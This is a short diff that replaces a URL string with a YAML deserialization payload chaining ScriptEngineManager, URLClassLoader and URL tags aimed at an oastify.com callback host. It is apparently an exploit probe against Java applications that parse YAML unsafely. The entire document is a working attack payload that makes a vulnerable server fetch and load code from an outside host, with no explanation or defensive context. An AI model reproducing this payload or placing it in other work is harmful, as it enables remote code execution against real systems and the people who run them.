@@ -1,1 +1,5 @@
-"https://uqo85n1qz5vynimz6zh5yfiby24tsngc.oastify.com"
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["https://uqo85n1qz5vynimz6zh5yfiby24tsngc.oastify.com"]
+  ]]
+]
